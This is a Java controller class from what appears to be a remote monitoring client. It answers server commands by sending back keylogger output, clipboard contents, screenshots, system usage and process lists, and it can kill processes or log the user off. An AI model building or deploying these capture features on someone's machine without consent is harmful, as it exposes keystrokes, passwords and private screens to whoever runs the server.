package controllers;

import client.Client;
import models.MessageModel;
import models.SystemInfoModel;
import org.json.JSONArray;
import utils.JSON;
import utils.KeyLogger;
import utils.console;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.TimeUnit;

import static utils.Command.*;
import static utils.Environment.DEFAULT_FROM;
import static utils.Environment.DEFAULT_SERVER_HOST;

public class Controller {
    private static SystemInfoModel si = new SystemInfoModel();
    private static Map<String, Executable<JSON>> controller = new HashMap();
    private static final String SHUTDOWN_NOTIFICATION_TEMPLATE = "Client's computer will be logoff in %s minutes";
    private static final String END_PROCESS_NOTIFICATION_TEMPLATE = "%s will be shutdown in %s minutes";
    private static final String NOTIFICATION_PROPERTY = "notification";
    private static final String COUNTDOWN_PROPERTY = "countdown";
    private static final String PID_PROPERTY = "pid";

    public static void init() {
        put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
        put(COMMAND_CLIENT_SYSTEM_USAGE, Controller::getMonitoring);
        put(COMMAND_CLIENT_CLIPBOARD, Controller::getClipboard);
        put(COMMAND_END_CLIENT_PROCESS, Controller::endProcess);
        put(COMMAND_CLIENT_KEYLOGGER, Controller::getKeylogger);
        put(COMMAND_CLIENT_PROCESS, Controller::getProcess);
        put(COMMAND_CLIENT_MONITOR, Controller::getScreen);
        put(COMMAND_SHUTDOWN_CLIENT, Controller::shutdown);
    }

    private static String getKeylogger(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_KEYLOGGER).put("keylogger", KeyLogger.getLog()).json();
    }

    private static String getClipboard(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_CLIPBOARD).put("clipboard", si.getClipboard()).json();
    }

    private static String getClientSystemInfo(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_SYSTEM_INFO).put("result", new JSON(si)).json();
    }

    private static String getScreen(JSON input) {
        try {
            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", byteArrayOutputStream);
            byte[] tmp = byteArrayOutputStream.toByteArray();
            return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_MONITOR)
                    .put("image", new JSONArray(tmp))
                    .put("length", tmp.length)
                    .json();
        } catch (Exception e) {
            return getScreen(input);
        }
    }

    private static String getMonitoring(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_SYSTEM_USAGE)
                .put("ram", si.getMemoryLoadPercentage())
                .put("cpu", si.getProcessorLoadPercentage())
                .put("disk", si.getDriveLoadPercentage())
                .json();
    }

    private static String getProcess(JSON input) {
        JSONArray processes = new JSONArray();
        /**
         * 2 IN CONDITION IS STAND FOR PROCESS WITH EMPTY INFO "[]"
         * PROCESS WITH NORMAL INFO "[ABC:123, XYZ:456, ...]"
         */
        ProcessHandle.allProcesses()
                .filter(ph -> ph.parent().isPresent() && (ph.info().toString().length() > 2))
                .forEach(process -> {
                    String[] cmd = process.info().command().get().split("\\\\");
                    processes.put(new JSON().put(PID_PROPERTY, process.pid()).put("cmd", cmd[cmd.length-1]));
                });
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_PROCESS).put("processes", processes).json();
    }

    private static String shutdown(JSON input) {
        long countdown = input.getLong(COUNTDOWN_PROPERTY);

        Client.getScheduler().schedule(() -> logoff(), countdown, TimeUnit.MINUTES);

        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NOTIFICATION)
                .put(NOTIFICATION_PROPERTY, String.format(SHUTDOWN_NOTIFICATION_TEMPLATE, countdown)).json();
    }

    private static String endProcess(JSON input) {
        Integer pid = input.getInt(PID_PROPERTY);
        long countdown = input.getLong(COUNTDOWN_PROPERTY);

        Client.getScheduler().schedule(() -> ProcessHandle.of(pid).ifPresent(ProcessHandle::destroy), countdown, TimeUnit.MINUTES);

        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NOTIFICATION)
                .put(NOTIFICATION_PROPERTY, String.format(END_PROCESS_NOTIFICATION_TEMPLATE, pid, countdown)).json();
    }

    //WINDOW SUPPORT ONLY
    private static void logoff() {
        /**
         * https://stackoverflow.com/questions/25637/shutting-down-a-computer
         * https://stackoverflow.com/questions/18964579/logoff-computer-using-java
         *
         */
        try {
            Runtime.getRuntime().exec("shutdown.exe -l");
        } catch (IOException e) {
            logoff();
        }
    }

    //CONCEPTION
    private static String getNotFoundController(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, null).json();
    }

    public static Executable get(String key) {
        return controller.getOrDefault(key, Controller::getNotFoundController);
    }

    public static Executable put(String key, Executable<JSON> value) {
        return controller.put(key, value);
    }
}
